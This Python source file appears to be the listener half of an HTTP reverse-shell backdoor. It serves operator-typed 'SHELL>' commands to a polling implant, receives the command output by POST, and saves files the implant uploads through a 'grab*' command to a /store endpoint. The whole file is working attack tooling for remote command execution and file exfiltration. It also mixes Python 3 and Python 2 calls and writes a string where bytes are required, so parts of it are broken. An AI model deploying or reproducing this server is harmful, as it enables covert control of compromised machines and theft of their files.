from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler
import cgi
ft = ''


class ServerHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        cmd = input("SHELL>")
        if 'grab' in cmd:
            c,f = cmd.split('*')
            global ft
            fn,ft = f.split('.')
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(cmd)

    def do_POST(self):
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile,
                                          headers=self.headers,
                                          environ={'REQUEST_METHOD': 'POST'}
                                          )
                else:
                    print("[-] Unexpected POST request")
                fs_up = fs['file']
                with open('output.{}'.format(ft), 'wb') as o:  # create a file holder called o/p.file format
                    o.write(fs_up.file.read())
                    self.send_response(200)
                    self.end_headers()
                print('success')
            except Exception as e:
                print(e)

            return

        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        printvar = self.rfile.read(length)
        print(printvar)


def main():
    print("starting server.....")
    serveraddress = ('localhost',50505)
    httpd = HTTPServer(serveraddress,ServerHandler)
    print("running server")
    try:
        httpd.serve_forever()

    except KeyboardInterrupt:
        print('[!] Server is terminated')
        httpd.server_close()


if __name__ == '__main__':
    main()
